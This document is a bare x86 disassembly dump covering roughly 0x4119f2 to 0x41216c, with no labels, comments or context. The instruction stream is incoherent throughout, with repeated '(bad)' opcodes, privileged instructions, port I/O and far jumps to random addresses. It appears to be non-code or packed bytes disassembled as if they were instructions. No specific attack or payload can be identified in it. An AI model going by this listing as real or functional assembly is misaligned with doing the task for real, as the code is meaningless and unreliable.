  4119f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4119f3:	cmp    eax,0xe2b5ce29
  4119f8:	mov    ah,0xd8
  4119fa:	scas   eax,DWORD PTR es:[edi]
  4119fb:	ins    BYTE PTR es:[edi],dx
  4119fc:	inc    edi
  4119fd:	pop    edi
  4119fe:	cwde   
  4119ff:	sbb    dh,dl
  411a01:	add    ebp,DWORD PTR [edi+0x753f03bf]
  411a07:	aaa    
  411a08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a09:	retf   0x6fb6
  411a0c:	mov    dl,BYTE PTR [ebx]
  411a0e:	int    0x6f
  411a10:	and    al,0xfa
  411a12:	enter  0x9904,0x35
  411a16:	dec    ebx
  411a17:	sub    al,0x5d
  411a19:	fwait
  411a1a:	and    ah,dl
  411a1c:	aas    
  411a1d:	mov    al,ds:0x54f873e9
  411a22:	inc    eax
  411a23:	adc    bl,dh
  411a25:	aas    
  411a26:	dec    esp
  411a27:	or     BYTE PTR [ebx+0x70e73f87],0xbe
  411a2e:	xor    eax,0x779c6e26
  411a33:	push   ebx
  411a34:	in     al,dx
  411a35:	retf   0x723a
  411a38:	stos   BYTE PTR es:[edi],al
  411a39:	xor    al,0xd
  411a3b:	mov    dl,0x2d
  411a3d:	cmp    eax,0xfda2ab5a
  411a42:	aaa    
  411a43:	stos   DWORD PTR es:[edi],eax
  411a44:	inc    eax
  411a45:	mov    esi,0x74a3649e
  411a4a:	fwait
  411a4b:	xchg   BYTE PTR [ebp-0x2c],ah
  411a4e:	outs   dx,DWORD PTR ds:[esi]
  411a4f:	pop    edi
  411a50:	rcl    esp,cl
  411a52:	scas   eax,DWORD PTR es:[edi]
  411a53:	mov    esi,0x4bda8950
  411a58:	inc    esp
  411a59:	dec    esi
  411a5a:	popa   
  411a5b:	int    0x40
  411a5d:	in     eax,0x31
  411a5f:	push   esi
  411a60:	cwde   
  411a61:	sbb    bh,BYTE PTR [esp+eax*2+0x4e]
  411a65:	xor    edi,DWORD PTR [ebx-0x51]
  411a68:	jbe    0x4119f9
  411a6a:	ficom  WORD PTR [eax+0x16]
  411a6d:	add    eax,0xc174fd67
  411a72:	sub    edx,DWORD PTR [eax+0x33]
  411a75:	in     eax,0x1e
  411a77:	pop    bx
  411a79:	(bad)  
  411a7a:	sti    
  411a7b:	cmp    al,0x96
  411a7d:	cs lock sbb eax,0xa12100c7
  411a84:	(bad)  
  411a85:	ror    BYTE PTR [ecx],0x5a
  411a88:	mov    ch,0x80
  411a8a:	dec    edi
  411a8b:	push   cs
  411a8c:	jp     0x411abe
  411a8e:	mov    DWORD PTR ds:[edx],ebx
  411a91:	inc    ebx
  411a92:	rcr    BYTE PTR [ebp-0x7d64836],cl
  411a98:	ins    BYTE PTR es:[edi],dx
  411a99:	sbb    ebp,DWORD PTR [eax-0x2b6ca1f1]
  411a9f:	(bad)  
  411aa1:	inc    ebp
  411aa2:	mov    bl,0x72
  411aa4:	xchg   edx,eax
  411aa5:	fild   WORD PTR [esi+0x3dfdb156]
  411aab:	mov    esi,0xf64bf98c
  411ab0:	(bad)  
  411ab1:	(bad)  
  411ab3:	ror    DWORD PTR [ebp-0x553333d1],1
  411ab9:	sbb    DWORD PTR [ebp+0x63],eax
  411abc:	aas    
  411abd:	std    
  411abe:	add    eax,0x5aec4f2a
  411ac3:	clc    
  411ac4:	stc    
  411ac5:	icebp  
  411ac6:	inc    esi
  411ac7:	cmp    eax,0x18c5fe2d
  411acc:	mov    esp,0x108137cc
  411ad1:	jp     0x411b24
  411ad3:	(bad)  
  411ad4:	dec    edi
  411ad5:	pop    es
  411ad6:	pop    ebp
  411ad7:	add    ebp,edx
  411ad9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ada:	pop    esi
  411adb:	xchg   esi,eax
  411adc:	add    al,0xd7
  411ade:	mov    WORD PTR [eax-0x2e],es
  411ae1:	imul   eax,DWORD PTR [edx+0x837d253],0xd22e673
  411aeb:	loopne 0x411a7b
  411aed:	push   0x43
  411aef:	push   ecx
  411af0:	pop    es
  411af1:	je     0x411b5b
  411af3:	mov    bh,0x82
  411af5:	call   FWORD PTR [ebp-0x26c2f954]
  411afb:	imul   ecx,DWORD PTR [ecx+ebx*4-0x46a4b45a],0xffbc9eeb
  411b06:	out    dx,eax
  411b07:	mov    WORD PTR [eax+edx*8],es
  411b0a:	aam    0x86
  411b0c:	push   ecx
  411b0d:	das    
  411b0e:	bound  ebp,QWORD PTR [ebx]
  411b10:	pop    edx
  411b11:	loope  0x411b20
  411b13:	int    0x29
  411b15:	test   eax,0xef604d29
  411b1a:	add    al,0xdb
  411b1c:	add    dl,0xc9
  411b1f:	idiv   dh
  411b21:	jb     0x411ba0
  411b23:	(bad)  
  411b24:	pop    ebx
  411b25:	mov    esp,0xcc72361d
  411b2a:	in     eax,dx
  411b2b:	mov    ebx,0xbe3accff
  411b30:	pop    ebx
  411b31:	xor    bh,BYTE PTR [edx-0x10]
  411b34:	sub    BYTE PTR [eax-0x40],ch
  411b37:	inc    ecx
  411b38:	les    eax,FWORD PTR [edx-0x41]
  411b3b:	jl     0x411b7d
  411b3d:	push   ecx
  411b3e:	repnz mov al,0xd2
  411b41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411b42:	mov    eax,ds:0xe552fa6c
  411b47:	push   es
  411b48:	sbb    esi,DWORD PTR [esi]
  411b4a:	adc    DWORD PTR [edx],0xfff7b834
  411b50:	cld    
  411b51:	jle    0x411b00
  411b53:	pusha  
  411b54:	add    esi,DWORD PTR [ecx]
  411b56:	sub    bh,al
  411b58:	mov    ebx,0x9aadd0fa
  411b5d:	push   0x68752bde
  411b62:	or     eax,0xe39806a3
  411b67:	sbb    ah,dh
  411b69:	inc    edi
  411b6a:	fwait
  411b6b:	cmp    ebp,0xd5d95bd9
  411b71:	xor    esi,ebx
  411b73:	lds    esi,FWORD PTR [edi]
  411b75:	sbb    esp,DWORD PTR [ecx-0x68]
  411b78:	and    esi,esp
  411b7a:	fcmove st,st(1)
  411b7c:	inc    edi
  411b7d:	dec    DWORD PTR [edi+0x20]
  411b80:	jge    0x411b0c
  411b82:	and    eax,DWORD PTR [ecx-0x7bc751f3]
  411b88:	loope  0x411b3c
  411b8a:	enter  0x78df,0x5f
  411b8e:	inc    edx
  411b8f:	add    al,0x3
  411b91:	addr16 push 0xfc36f77c
  411b97:	sub    ch,BYTE PTR [ebx-0x35ddbe78]
  411b9d:	mov    cl,0x28
  411b9f:	daa    
  411ba0:	cld    
  411ba1:	cli    
  411ba2:	jp     0x411ba9
  411ba4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ba5:	(bad)  
  411ba6:	dec    ebp
  411ba7:	mov    ch,0xc4
  411ba9:	bnd jp 0x411b49
  411bac:	mov    dh,0xb1
  411bae:	sub    al,0x26
  411bb0:	in     al,0x29
  411bb2:	xlat   BYTE PTR ds:[ebx]
  411bb3:	cmp    BYTE PTR [ecx],al
  411bb5:	push   0xffffff88
  411bb7:	inc    eax
  411bb8:	lods   al,BYTE PTR ds:[esi]
  411bb9:	lock mov dh,0x1f
  411bbc:	mov    ebp,0x9dd8ee83
  411bc1:	rol    esi,1
  411bc3:	or     eax,0xaecb01d1
  411bc8:	lods   al,BYTE PTR ds:[esi]
  411bc9:	xor    ecx,DWORD PTR [ebx+edx*1]
  411bcc:	ss mov ebx,0x698febf2
  411bd2:	pop    esi
  411bd3:	lock sbb DWORD PTR cs:[esi+0x40],0x5beb0e7
  411bdc:	xchg   ebx,eax
  411bdd:	jmp    0x411b8f
  411bdf:	daa    
  411be0:	mov    esi,0x628d7b9a
  411be5:	mov    ch,BYTE PTR [eax]
  411be7:	or     DWORD PTR [esi],0xbc59c0bc
  411bed:	out    0xd6,eax
  411bef:	outs   dx,DWORD PTR ds:[esi]
  411bf0:	or     bh,BYTE PTR [esp+ebx*2]
  411bf3:	lea    ecx,[eax-0x63]
  411bf6:	retf   
  411bf7:	fadd   st,st(4)
  411bf9:	mov    ebp,0xacdab99
  411bfe:	ds das 
  411c00:	inc    edi
  411c01:	sub    eax,0x5edfca
  411c06:	jmp    0x23b24f17
  411c0b:	and    al,BYTE PTR [edx+ebx*2]
  411c0e:	dec    edi
  411c0f:	add    eax,0xe6a4a373
  411c14:	jmp    0x411b9e
  411c16:	xor    bl,BYTE PTR gs:[ebx+0x5ce38500]
  411c1d:	shl    ch,0xa6
  411c20:	fimul  DWORD PTR [edi-0x17]
  411c23:	rcl    eax,0xb4
  411c26:	jmp    0x3b93:0xdc183ee0
  411c2d:	push   ds
  411c2e:	iret   
  411c2f:	push   esp
  411c30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411c31:	mov    al,ds:0x54469b1b
  411c36:	jns    0x411c6d
  411c38:	pop    esi
  411c39:	push   eax
  411c3a:	xchg   ebp,eax
  411c3b:	test   al,0xfe
  411c3d:	mov    ?,WORD PTR [ebx]
  411c3f:	in     eax,0xc2
  411c41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411c42:	pushf  
  411c43:	repz xlat BYTE PTR ds:[ebx]
  411c45:	ret    0x4e45
  411c48:	jae    0x411c56
  411c4a:	in     eax,0xf3
  411c4c:	pop    ebp
  411c4d:	sbb    al,0xcd
  411c4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c50:	in     al,dx
  411c51:	and    BYTE PTR [ecx-0x4b58f29e],ch
  411c57:	out    0x3b,eax
  411c59:	or     eax,ebp
  411c5b:	cmc    
  411c5c:	push   ebx
  411c5d:	pop    ebp
  411c5e:	pushf  
  411c5f:	pop    esi
  411c60:	cld    
  411c61:	push   esi
  411c62:	pop    es
  411c63:	push   ss
  411c64:	stos   DWORD PTR es:[edi],eax
  411c65:	cmp    al,0xc1
  411c67:	jg     0x411c1f
  411c69:	pop    esp
  411c6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411c6b:	dec    ebp
  411c6c:	dec    esp
  411c6d:	in     al,dx
  411c6e:	in     eax,0xf3
  411c70:	stos   DWORD PTR es:[edi],eax
  411c71:	sub    al,0x35
  411c73:	pop    es
  411c74:	jmp    0xb3b0:0xb36ff733
  411c7b:	aam    0xfa
  411c7d:	adc    al,al
  411c7f:	xor    esi,DWORD PTR [eax]
  411c81:	jmp    0xbda3:0xf4026711
  411c88:	or     BYTE PTR [edi-0x21ab3c3c],ch
  411c8e:	iret   
  411c8f:	dec    edi
  411c90:	push   0xffffffb5
  411c92:	adc    BYTE PTR [edi],al
  411c94:	and    BYTE PTR [edi],cl
  411c96:	mov    ah,0x80
  411c98:	adc    ah,BYTE PTR [eax+0x76]
  411c9b:	or     BYTE PTR [edi+0x5fa5edc0],bh
  411ca1:	and    BYTE PTR [ebx-0x6f],dh
  411ca4:	jnp    0x411c68
  411ca6:	(bad)  
  411ca7:	pop    esp
  411ca8:	(bad)  
  411ca9:	xor    DWORD PTR [ebx+ecx*4],esp
  411cac:	enter  0x3802,0x4d
  411cb0:	pop    eax
  411cb1:	inc    edx
  411cb2:	jb     0x411cb5
  411cb4:	xor    al,ah
  411cb6:	lahf   
  411cb7:	xchg   edx,eax
  411cb8:	fwait
  411cb9:	and    ebp,DWORD PTR [ebp+0xd51d695]
  411cbf:	cmp    ecx,DWORD PTR [ecx]
  411cc1:	cmc    
  411cc2:	(bad)  
  411cc3:	mov    edi,0x78d8c9f7
  411cc8:	rcr    BYTE PTR [edx-0x3a],0xaf
  411ccc:	out    dx,eax
  411ccd:	pop    edi
  411cce:	cmp    dh,dl
  411cd0:	mov    ebp,0xbb614609
  411cd5:	add    bh,0x23
  411cd8:	ror    DWORD PTR [ebp-0x46562e75],0x8b
  411cdf:	fidiv  DWORD PTR [ebp+0x1a]
  411ce2:	sar    dh,cl
  411ce4:	push   es
  411ce5:	mov    bl,BYTE PTR [esp+eax*1+0x65]
  411ce9:	repz pop ds
  411ceb:	pushf  
  411cec:	lods   eax,DWORD PTR ds:[esi]
  411ced:	mov    dl,al
  411cef:	scas   eax,DWORD PTR es:[edi]
  411cf0:	cmc    
  411cf1:	in     eax,dx
  411cf2:	scas   eax,DWORD PTR es:[edi]
  411cf3:	cli    
  411cf4:	lods   al,BYTE PTR ds:[esi]
  411cf5:	aam    0x54
  411cf7:	dec    esp
  411cf8:	cmp    dh,bl
  411cfa:	lea    edi,[edx+edi*4-0x8]
  411cfe:	pop    ss
  411cff:	jne    0x411ce0
  411d01:	ss jbe 0x411cab
  411d04:	sub    esp,DWORD PTR [eax]
  411d06:	xchg   edi,eax
  411d08:	xchg   esi,eax
  411d09:	aaa    
  411d0a:	cmp    edi,esi
  411d0c:	retf   
  411d0d:	loope  0x411d6a
  411d0f:	add    al,0x85
  411d11:	in     eax,dx
  411d12:	dec    ebx
  411d13:	sub    esi,edx
  411d15:	push   ecx
  411d16:	test   eax,0x78b958d3
  411d1b:	setle  al
  411d1e:	mov    fs,WORD PTR [esi-0x2160235a]
  411d24:	mov    al,0x19
  411d26:	push   ss
  411d27:	or     DWORD PTR [esi],ecx
  411d29:	mov    WORD PTR [ecx+edi*4+0x69],?
  411d2d:	lea    esi,[ebx+0x659ee81a]
  411d33:	mov    ah,0x77
  411d35:	std    
  411d36:	(bad)
  411d39:	fnsave [ebp+0x62]
  411d3c:	add    DWORD PTR [esi-0x3c],ebp
  411d3f:	retf   
  411d40:	push   0x76
  411d42:	rol    ecx,1
  411d44:	int    0xb3
  411d46:	outs   dx,DWORD PTR ds:[esi]
  411d47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d48:	mov    al,0x55
  411d4a:	mov    edi,0x9b803da9
  411d4f:	imul   BYTE PTR [edx]
  411d51:	je     0x411d31
  411d53:	mov    al,0xe9
  411d55:	push   es
  411d56:	or     esi,DWORD PTR [edi+0xe]
  411d59:	fbstp  TBYTE PTR [ecx-0xc]
  411d5c:	and    cl,dl
  411d5e:	shl    BYTE PTR [ecx],0x90
  411d61:	cmp    al,0xf9
  411d63:	loop   0x411dce
  411d65:	lahf   
  411d66:	fdivr  DWORD PTR [esi+0x327d3154]
  411d6c:	(bad)  
  411d6d:	in     al,dx
  411d6e:	popa   
  411d6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411d70:	popa   
  411d71:	out    dx,eax
  411d72:	push   ss
  411d73:	scas   eax,DWORD PTR es:[edi]
  411d74:	inc    edi
  411d75:	nop
  411d76:	repz cmp BYTE PTR [esi+0x6f],ah
  411d7a:	fsub   st,st(5)
  411d7c:	push   0x27
  411d7e:	lea    ebp,[ebx-0xfa25b30]
  411d84:	cmc    
  411d85:	popf   
  411d86:	pop    ebp
  411d87:	mov    ?,eax
  411d89:	pop    esi
  411d8a:	and    eax,0xac00feb7
  411d8f:	sub    esp,edx
  411d91:	xor    bh,dl
  411d93:	cld    
  411d94:	outs   dx,BYTE PTR ds:[esi]
  411d95:	inc    esp
  411d96:	(bad)  
  411d97:	or     eax,0x41d097ef
  411d9c:	pop    es
  411d9d:	pop    ebx
  411d9e:	sar    dh,1
  411da0:	inc    edx
  411da1:	in     eax,0xab
  411da3:	test   al,0x44
  411da5:	push   edi
  411da6:	fstp   TBYTE PTR [eax+0x73]
  411daa:	add    al,0x90
  411dac:	push   ds
  411dad:	mov    dh,0x80
  411daf:	jmp    0x411e17
  411db1:	dec    edx
  411db2:	pop    es
  411db3:	mov    esp,fs
  411db5:	int3   
  411db6:	jae    0x411d43
  411db8:	data16 aaa 
  411dba:	int3   
  411dbb:	enter  0xa05,0x3
  411dbf:	mov    edx,0xdd6207e2
  411dc4:	(bad)  
  411dc5:	stc    
  411dc6:	dec    esp
  411dc7:	jl     0x411d51
  411dc9:	mov    esi,0x55742047
  411dce:	adc    dl,ch
  411dd0:	aas    
  411dd1:	ret    0x353e
  411dd4:	out    0xa6,eax
  411dd6:	pop    edx
  411dd7:	lods   eax,DWORD PTR ds:[esi]
  411dd8:	xchg   ebx,eax
  411dd9:	pop    esi
  411dda:	adc    DWORD PTR [edx+0x1a],0xceafec6a
  411de1:	test   BYTE PTR [ebp+ecx*1+0x7f],0x38
  411de6:	mov    edx,0x7db361f5
  411deb:	call   0x3d80b4e4
  411df0:	mov    al,ds:0x29662c8a
  411df5:	in     eax,dx
  411df6:	cmp    ebp,DWORD PTR [edx-0x45]
  411df9:	xor    DWORD PTR ds:0x4b34555c,edx
  411dff:	jecxz  0x411dbb
  411e01:	mul    DWORD PTR [ebx+0x4c]
  411e04:	ret    0x4f5c
  411e07:	mov    al,0x74
  411e09:	sahf   
  411e0a:	push   ecx
  411e0b:	push   0xf0226037
  411e10:	mov    ebx,0x562e0c37
  411e15:	fdiv   st(1),st
  411e17:	add    BYTE PTR [ecx],0xd5
  411e1a:	mov    al,0x4e
  411e1d:	stos   DWORD PTR es:[edi],eax
  411e1e:	push   edi
  411e1f:	xor    BYTE PTR [edi+esi*4+0x44],ch
  411e23:	adc    al,0x30
  411e25:	mov    ecx,0xa0c72a85
  411e2a:	jbe    0x411e89
  411e2c:	xor    edi,DWORD PTR [edi]
  411e2e:	dec    edi
  411e2f:	rol    cl,0x6f
  411e32:	jns    0x411dd2
  411e34:	pop    edx
  411e35:	add    eax,0x84e42f0e
  411e3a:	outs   dx,BYTE PTR ds:[esi]
  411e3b:	fisttp DWORD PTR [ecx-0x3d25ad7f]
  411e41:	xor    cl,dl
  411e43:	xor    bh,ch
  411e45:	jl     0x411eb7
  411e47:	repz jp 0x411e65
  411e4a:	das    
  411e4b:	jb     0x411e91
  411e4d:	or     al,0x68
  411e4f:	mov    esp,ss
  411e51:	js     0x411ed0
  411e53:	(bad)
  411e56:	inc    edx
  411e57:	jne    0x411e04
  411e59:	mov    al,ds:0xddfb972e
  411e5e:	je     0x411e10
  411e60:	daa    
  411e61:	fs xor eax,esp
  411e64:	sbb    dh,BYTE PTR [edx]
  411e66:	jbe    0x411e43
  411e68:	mov    eax,DWORD PTR [esi]
  411e6a:	adc    BYTE PTR [ebx+0x4],0xe4
  411e6e:	adc    DWORD PTR [edi-0x20],ebx
  411e71:	xchg   esp,eax
  411e72:	jb     0x411e19
  411e74:	pop    ebx
  411e75:	mov    ecx,0x376a31f
  411e7a:	adc    DWORD PTR [edx+edx*8-0x2bd923cd],0x488037a7
  411e85:	les    esp,FWORD PTR [ebx+0x67]
  411e88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e89:	sub    ecx,esi
  411e8b:	call   0x9580:0xba3b1931
  411e92:	mov    edi,0xe10efb21
  411e97:	and    BYTE PTR [edx-0x5c],al
  411e9a:	in     eax,0x18
  411e9c:	int3   
  411e9d:	aas    
  411e9e:	js     0x411f12
  411ea0:	cmp    eax,0x78615945
  411ea5:	pop    esi
  411ea6:	dec    ebx
  411ea7:	inc    esp
  411ea8:	js     0x411ef3
  411eaa:	and    eax,0x6ab6e667
  411eaf:	push   edx
  411eb0:	mov    dl,0x8f
  411eb2:	daa    
  411eb3:	add    BYTE PTR [edx],0xa2
  411eb6:	mov    WORD PTR [edi+0x5],?
  411eb9:	inc    edi
  411eba:	stos   DWORD PTR es:[edi],eax
  411ebb:	retf   
  411ebc:	vcvtss2sd xmm4,xmm2,DWORD PTR [esi+0x27292b6a]
  411ec4:	push   cs
  411ec5:	lahf   
  411ec6:	(bad)  
  411ec7:	mov    ds:0xb7f9a25c,al
  411ecc:	aas    
  411ecd:	mov    ds:0x62d3d563,al
  411ed2:	pop    ecx
  411ed3:	(bad)  
  411ed5:	scas   eax,DWORD PTR es:[edi]
  411ed6:	dec    ecx
  411ed7:	ins    BYTE PTR es:[edi],dx
  411ed8:	wrmsr  
  411eda:	xor    ebp,esi
  411edc:	mov    ah,0xd4
  411ede:	aam    0xe6
  411ee0:	jg     0x411ec9
  411ee2:	add    BYTE PTR [ecx-0x3f],cl
  411ee5:	into   
  411ee6:	sub    ah,BYTE PTR [ecx]
  411ee8:	push   ecx
  411ee9:	jne    0x411f37
  411eeb:	ret    
  411eec:	push   ss
  411eed:	push   ebx
  411eee:	stos   BYTE PTR es:[edi],al
  411eef:	mov    bh,0xf9
  411ef1:	test   BYTE PTR ds:0x82e24a29,0xb
  411ef8:	mov    esi,0xc36ac2f6
  411efd:	lock fsubr DWORD PTR [esi]
  411f00:	ret    
  411f01:	scas   al,BYTE PTR es:[edi]
  411f02:	lahf   
  411f03:	xchg   BYTE PTR ds:0x304e4ac3,dh
  411f09:	and    DWORD PTR [ebp-0x15de6f6],edi
  411f0f:	ins    DWORD PTR es:[edi],dx
  411f10:	mov    ebp,0x7d990d6c
  411f15:	clc    
  411f16:	xor    DWORD PTR [ebx],0xe87992d0
  411f1c:	mov    ecx,0xd1791e27
  411f21:	lods   eax,DWORD PTR ds:[esi]
  411f22:	mov    esi,0xf860ef72
  411f27:	loopne 0x411f9d
  411f29:	addr16 push ss
  411f2b:	mov    esi,0x555bd517
  411f30:	xchg   ebp,eax
  411f31:	pushf  
  411f32:	gs or  al,ch
  411f35:	lock adc ebx,DWORD PTR [edx-0x10748a7e]
  411f3c:	aad    0x5e
  411f3e:	add    DWORD PTR [ebp-0x67],ebx
  411f41:	pushf  
  411f42:	dec    eax
  411f43:	and    al,0x1d
  411f45:	ret    
  411f46:	adc    eax,0x4895f37e
  411f4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411f4c:	call   0x8d7b1d47
  411f51:	jp     0x411f8a
  411f53:	mov    BYTE PTR [edx],ch
  411f55:	sub    BYTE PTR [ebx-0x2b],bl
  411f58:	stos   DWORD PTR es:[edi],eax
  411f59:	(bad)  
  411f5a:	in     eax,dx
  411f5b:	or     bl,dh
  411f5d:	add    edx,edi
  411f5f:	mov    ds:0xb87dba46,al
  411f64:	jnp    0x411ef0
  411f66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f67:	test   al,0x7e
  411f69:	add    bl,dl
  411f6b:	jmp    0x411fc7
  411f6d:	stos   DWORD PTR es:[edi],eax
  411f6e:	das    
  411f6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f70:	xchg   esi,eax
  411f71:	or     al,0x5b
  411f73:	push   esi
  411f74:	pop    edi
  411f75:	push   cs
  411f76:	lea    ebx,[edx+0x11]
  411f79:	push   ds
  411f7a:	inc    ecx
  411f7b:	jmp    0xee5a:0x22597dd5
  411f82:	xchg   BYTE PTR [edi+0x72],al
  411f85:	ja     0x411fe1
  411f87:	ret    0x303
  411f8a:	ret    0x26b5
  411f8d:	sub    BYTE PTR [edi+edx*8],bl
  411f90:	or     al,0x47
  411f92:	int    0xd7
  411f94:	mov    dl,0x33
  411f96:	stos   DWORD PTR es:[edi],eax
  411f97:	or     dl,dh
  411f99:	scas   al,BYTE PTR es:[edi]
  411f9a:	inc    eax
  411f9b:	jecxz  0x411f7d
  411f9d:	jecxz  0x411fa9
  411f9f:	dec    esp
  411fa0:	pushf  
  411fa1:	sbb    eax,0x9a052b47
  411fa6:	fimul  WORD PTR [ecx]
  411fa8:	scas   al,BYTE PTR es:[edi]
  411fa9:	sub    ecx,DWORD PTR [eax+0x44]
  411fac:	adc    al,0xdd
  411fae:	and    DWORD PTR [ebx+0x69],esp
  411fb1:	push   0x6bbe301f
  411fb6:	mov    DWORD PTR [edx],0xed2e2a9f
  411fbc:	ret    
  411fbd:	psrlq  mm0,QWORD PTR [eax-0x3a007f18]
  411fc4:	pop    esp
  411fc5:	aam    0xdc
  411fc7:	adc    ecx,DWORD PTR [eax+0x77da2f41]
  411fcd:	cld    
  411fce:	bound  eax,QWORD PTR [edx]
  411fd0:	imul   edx,DWORD PTR [esp+ebx*8+0x5e],0x14b7d608
  411fd8:	icebp  
  411fd9:	add    DWORD PTR [edx+ebx*8],ebx
  411fdc:	mov    dl,0x7c
  411fde:	(bad)  
  411fdf:	cmp    al,0x83
  411fe1:	jg     0x41205a
  411fe3:	test   DWORD PTR [bx+si+0xba5],eax
  411fe8:	jmp    0xee5f6479
  411fed:	and    ecx,0x22
  411ff0:	mov    es,WORD PTR [edx+0xc33bcc7]
  411ff6:	(bad)  
  411ff7:	push   esi
  411ff8:	pop    esi
  411ff9:	pusha  
  411ffa:	pusha  
  411ffb:	push   DWORD PTR [edi+0x6c6d7a6]
  412001:	in     al,0x54
  412003:	pop    esi
  412004:	sub    eax,0xb1bbe86c
  412009:	jge    0x412039
  41200b:	fldcw  WORD PTR ds:0xc57c755c
  412011:	jl     0x411fa4
  412013:	dec    esi
  412014:	mov    edi,DWORD PTR [ecx]
  412016:	jb     0x412071
  412018:	or     cl,BYTE PTR [ecx]
  41201a:	push   ebp
  41201b:	sar    BYTE PTR [ebx-0x69],1
  41201e:	call   0xc5:0x68e4728a
  412025:	rcl    bh,0x52
  412028:	and    BYTE PTR [ebx-0x2],0x33
  41202c:	dec    ecx
  41202d:	loope  0x411fed
  41202f:	div    BYTE PTR [edi+0x7a9a3033]
  412035:	call   0x461202b4
  41203a:	mov    ah,0x67
  41203c:	(bad)  
  41203d:	mov    cr1,ebx
  412040:	stos   BYTE PTR es:[edi],al
  412041:	stos   BYTE PTR es:[edi],al
  412042:	xlat   BYTE PTR ds:[ebx]
  412043:	scas   eax,DWORD PTR es:[edi]
  412044:	nop
  412045:	add    al,BYTE PTR [eax]
  412047:	mov    dh,0x37
  412049:	jmp    0x41202d
  41204b:	inc    esi
  41204c:	popf   
  41204d:	pop    ebx
  41204e:	jns    0x41205a
  412050:	out    0x3d,al
  412052:	push   ecx
  412053:	jb     0x41209f
  412055:	inc    ebx
  412056:	and    eax,esi
  412058:	out    0xc,eax
  41205a:	jbe    0x411ffa
  41205c:	mov    al,ds:0x531c0a83
  412061:	outs   dx,BYTE PTR ds:[esi]
  412062:	not    cl
  412064:	mov    bl,0x28
  412066:	mov    al,ds:0x1862ff14
  41206b:	cmp    dh,BYTE PTR [edx+0x7f04c8b1]
  412071:	int3   
  412072:	pop    edi
  412073:	mov    DWORD PTR ds:0x961ffe43,ebx
  412079:	fwait
  41207a:	jmp    0x6d3ab57d
  41207f:	lea    ecx,[ecx+0x2a65a07c]
  412085:	pop    ebp
  412086:	push   0x50
  412088:	in     al,0xc4
  41208a:	popf   
  41208b:	sbb    eax,esp
  41208d:	int    0x23
  41208f:	retf   
  412090:	xor    cl,0xda
  412093:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412094:	add    BYTE PTR [edi+0x6b],0x82
  412098:	sbb    ah,bl
  41209a:	arpl   WORD PTR [ebx-0x319a6b60],sp
  4120a0:	mov    al,0xee
  4120a2:	add    ebx,DWORD PTR [ebx+0x2d560fc3]
  4120a8:	ins    DWORD PTR es:[edi],dx
  4120a9:	mov    ch,0x36
  4120ab:	adc    eax,0x5df0d3bd
  4120b0:	shl    ebx,1
  4120b2:	aam    0x3c
  4120b4:	les    edx,FWORD PTR [esi+ecx*2]
  4120b7:	sub    BYTE PTR [ecx],0x1
  4120ba:	(bad)  
  4120bb:	iret   
  4120bc:	or     edx,ecx
  4120be:	mov    ebx,0xa58f9df9
  4120c3:	repnz sub al,0x1f
  4120c6:	adc    eax,0xb3920c6f
  4120cb:	retf   0x30
  4120ce:	xchg   ch,al
  4120d0:	add    esp,DWORD PTR [ebp+0xa]
  4120d3:	push   cs
  4120d4:	cmc    
  4120d5:	ror    DWORD PTR [edi],0x10
  4120d8:	cdq    
  4120d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4120da:	ds (bad) 
  4120dc:	ja     0x4120c4
  4120de:	sbb    eax,0x2f7e0679
  4120e3:	fnstenv [esi]
  4120e5:	sub    eax,0x6f469b32
  4120ea:	adc    eax,DWORD PTR [esp+ecx*8+0x374f6b9d]
  4120f1:	push   ebx
  4120f2:	or     ah,BYTE PTR [ecx]
  4120f4:	mov    ecx,DWORD PTR [eax-0x31daa122]
  4120fa:	mov    ds:0xd93b1e92,eax
  4120ff:	lock mov bh,al
  412102:	(bad)  [esi-0x46]
  412105:	rol    BYTE PTR [ebp-0x7b],cl
  412108:	or     ah,BYTE PTR [ebx+0x30]
  41210b:	dec    edi
  41210c:	pop    ebp
  41210d:	jae    0x4120c7
  41210f:	xor    al,0x41
  412111:	repz mov edi,0x37882063
  412117:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412118:	cmp    bl,BYTE PTR [ecx+0x6940d1]
  41211e:	(bad)  
  41211f:	xchg   ecx,eax
  412120:	sbb    eax,0x3b14056
  412125:	sub    dh,al
  412127:	aaa    
  412128:	fnsave [ecx]
  41212a:	(bad)  
  41212b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41212c:	jmp    0x412129
  41212e:	fisttp WORD PTR [ebx]
  412130:	(bad)  
  412131:	sbb    esi,ebp
  412133:	mov    edi,0x2067dade
  412138:	scas   al,BYTE PTR es:[edi]
  412139:	pusha  
  41213a:	sub    ecx,DWORD PTR [eax-0x4a]
  41213d:	outs   dx,BYTE PTR ds:[esi]
  41213e:	loopne 0x4120e1
  412140:	test   al,0xc
  412142:	mov    BYTE PTR [edi],al
  412144:	popa   
  412145:	add    bl,bl
  412147:	test   DWORD PTR [edi-0x46],ebp
  41214a:	xchg   esi,eax
  41214b:	gs aad 0xeb
  41214e:	fcompp 
  412150:	dec    edx
  412151:	push   0xffffff98
  412153:	dec    ecx
  412154:	in     eax,dx
  412155:	push   esi
  412156:	repz sbb BYTE PTR [eax],0x45
  41215a:	push   edi
  41215b:	dec    esp
  41215c:	loopne 0x412123
  41215e:	lock leave 
  412160:	in     al,0x7b
  412162:	add    eax,0x899f3b2c
  412167:	into   
  412168:	inc    esi
  412169:	add    edi,DWORD PTR [esi-0x7f]
  41216c:	mov    WORD PTR [edi],gs
